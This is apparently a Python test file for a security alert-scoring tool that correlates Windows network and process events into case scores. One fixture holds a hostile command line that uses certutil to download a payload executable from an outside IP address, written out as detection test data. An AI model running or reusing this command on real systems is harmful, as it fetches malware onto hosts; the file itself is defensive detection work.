"""Tests for case-level actionability scoring."""

from case_scoring import score_case
from normalizer import normalize_alert
from scoring import calculate_score

GUID_CERTUTIL = "{d1fc117c-9253-6ab2-a649-00000000a401}"
GUID_PARENT = "{d1fc117c-b114-6aa9-7e00-00000000a401}"


def make_event(event_id, timestamp, guid=None, parent_guid=None, image=None,
               parent_image=None, command_line=None, user=None, hashes=None,
               destination_ip=None, destination_port=None, protocol=None,
               technique="T1105", host="WIN-THESIS-01"):
    eventdata = {
        "processGuid": guid,
        "parentProcessGuid": parent_guid,
        "image": image,
        "parentImage": parent_image,
        "commandLine": command_line,
        "parentCommandLine": parent_image and command_line,
        "user": user,
        "hashes": hashes,
        "destinationIp": destination_ip,
        "destinationPort": destination_port,
        "protocol": protocol,
    }
    eventdata = {k: v for k, v in eventdata.items() if v is not None}
    return {
        "@timestamp": timestamp,
        "agent": {"name": host},
        "rule": {"level": 10, "mitre": {"id": [technique]}},
        "data": {"win": {"system": {"eventID": str(event_id)}, "eventdata": eventdata}},
    }


def network_event():
    return make_event(
        3, "2026-09-22T14:36:02.581Z", guid=GUID_CERTUTIL,
        image=r"C:\Windows\System32\certutil.exe", user="WIN-THESIS-01\\kevin",
        destination_ip="185.220.101.34", destination_port="80", protocol="tcp",
    )


def process_event():
    return make_event(
        1, "2026-09-22T14:36:02.574Z", guid=GUID_CERTUTIL, parent_guid=GUID_PARENT,
        image=r"C:\Windows\System32\certutil.exe", parent_image=r"C:\Windows\System32\cmd.exe",
        command_line="certutil -urlcache -split -f http://185.220.101.34/payload.exe C:\\Temp\\p.exe",
        user="WIN-THESIS-01\\kevin",
        hashes="SHA256=" + "C" * 64, protocol=None,
    )


def test_correlation_adds_evidence_to_case_score():
    seed = normalize_alert(network_event())
    process = normalize_alert(process_event())
    alert_score = calculate_score(network_event())["total_score"]

    single = score_case([seed], [], seed["id"])
    correlated = score_case(
        [seed, process],
        [{"source": seed["id"], "target": process["id"], "relation": "PROCESS_CONNECTED_TO", "confidence": 1.0}],
        seed["id"],
    )

    assert single["case_score"] < alert_score
    assert correlated["case_score"] > single["case_score"]
    assert correlated["case_score"] >= alert_score
    assert correlated["required_coverage"] > single["required_coverage"]


def test_repeated_evidence_is_deduplicated_and_capped():
    seed = normalize_alert(network_event())
    clones = [normalize_alert(network_event()) for _ in range(3)]
    for index, clone in enumerate(clones):
        clone["id"] = f"clone-{index}"
        clone["timestamp"] = f"2026-09-22T14:36:0{index}.000Z"

    edges = [
        {"source": seed["id"], "target": clone["id"], "relation": "SUPPORTING_CONTEXT", "confidence": 0.6}
        for clone in clones
    ]
    result = score_case([seed] + clones, edges, seed["id"])

    assert result["case_score"] <= 100.0
    destination = next(fact for fact in result["facts"] if fact["field"] == "destinationIp")
    assert destination["completeness"] == 1.0
    assert destination["consistency"] == 1.0
    assert destination["contribution"] < destination["weight"] * 1.0 + 1e-9


def test_invalid_ip_reduces_validity():
    seed = normalize_alert(network_event())
    valid = score_case([seed], [], seed["id"])
    broken_raw = network_event()
    broken_raw["data"]["win"]["eventdata"]["destinationIp"] = "185.220.101.34.999"
    broken = score_case([normalize_alert(broken_raw)], [], normalize_alert(broken_raw)["id"])

    valid_fact = next(fact for fact in valid["facts"] if fact["field"] == "destinationIp")
    broken_fact = next(fact for fact in broken["facts"] if fact["field"] == "destinationIp")
    assert valid_fact["validity"] == 1.0
    assert broken_fact["validity"] == 0.0
    assert broken["case_score"] < valid["case_score"]


def test_required_coverage_uses_technique_profile():
    seed = normalize_alert(network_event())
    result = score_case([seed], [], seed["id"])
    assert result["required_total"] > 0
    assert 0.0 <= result["required_coverage"] < 1.0

    process = normalize_alert(process_event())
    full = score_case(
        [seed, process],
        [{"source": seed["id"], "target": process["id"], "relation": "PROCESS_CONNECTED_TO", "confidence": 1.0}],
        seed["id"],
    )
    assert full["required_coverage"] == 1.0


def test_facts_expose_provenance_carriers():
    seed = normalize_alert(network_event())
    result = score_case([seed], [], seed["id"])
    destination = next(fact for fact in result["facts"] if fact["field"] == "destinationIp")
    assert destination["carriers"][0]["event_id"] == seed["id"]
    assert destination["carriers"][0]["value"] == "185.220.101.34"
    assert destination["role"] == "required"
